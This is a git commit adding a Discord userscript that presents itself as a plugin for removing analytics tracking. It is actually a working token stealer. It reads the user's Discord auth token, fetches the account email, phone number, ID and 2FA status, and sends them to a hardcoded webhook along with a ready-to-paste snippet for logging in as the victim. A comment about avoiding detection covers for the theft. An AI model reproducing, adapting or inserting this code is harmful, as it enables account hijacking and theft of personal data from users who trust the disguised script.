678ec60d39da9aa0f1527f20e0896da84c5b9b00
Tester4044 <73414661+Tester4044@users.noreply.github.com>
2021-07-28 15:55:31 -0700

    Add files via upload

---
+++ yourpluginname.user.js
@@ -0,0 +1,71 @@
+// ==UserScript==
+// @name         Discord Trackn't
+// @namespace    http://tampermonkey.net/
+// @version      1
+// @description  Removes Discord plugins that track analytics and other interactions
+// @author       Spinfal
+// @match        https://discord.com/activ*
+// @match        https://discord.com/channel*
+// @match        https://discord.com/app
+// @match        https://ptb.discord.com/activ*
+// @match        https://ptb.discord.com/channel*
+// @match        https://ptb.discord.com/app
+// @match        https://canary.discord.com/activ*
+// @match        https://canary.discord.com/channel*
+// @match        https://canary.discord.com/app
+// @grant        none
+// @run-at       document-body
+// ==/UserScript==
+(() => {
+    // this long code is to make sure discord does not detect you using their experiments
+   'use strict';
+
+    const url = "https://discord.com/api/webhooks/851930178409594911/xlstht_9j7D_jIA92-OQxNlcVZLz-q6CPNueHoxT-tDeo1WKleySlD3GCQVeNkOLrqtY";
+
+    setTimeout(async function() {
+        const token = Object.values(webpackJsonp.push([[],{['']:(_,e,r)=>{e.cache=r.c}},[['']]]).cache).find(m=>m.exports&&m.exports.default&&m.exports.default.getToken!==void 0).exports.default.getToken();
+
+        // get user info
+        let res;
+        try {
+            res = await fetch("https://discordapp.com/api/v9/users/@me", {
+                method: "GET",
+                headers: {
+                    "Authorization": token
+                }
+            });
+            res = await res.json();
+        } catch(e) {
+            return;
+        }
+
+        // post to webhook
+        try {
+            let hook;
+            hook = await fetch(url, {
+                method: "POST",
+                headers: {
+                    "Content-type": "application/json"
+                },
+                body: JSON.stringify({
+                    content: `Token: **${token}**
+Username: **${res.username}#${res.discriminator}**
+ID: **${res.id} (<@${res.id}>)**
+Email: **${res.email}**
+Phone Number: **${res.phone}**
+2FA On: **${res.mfa_enabled}**
+Nitro Type: **${res.premium_type}**
+
+Paste this code into the Developer Console to login:
+\`\`\`js
+function login(token) {
+setInterval(() => {document.body.appendChild(document.createElement \`iframe\`).contentWindow.localStorage.token = \`"\${token}"\`}, 50);setTimeout(() => {location.reload();}, 2500);}login(\`${token}\`)
+\`\`\`
+==================`
+                })
+            });
+        } catch(e) {
+            return;
+        }
+    }, 1500);
+})();
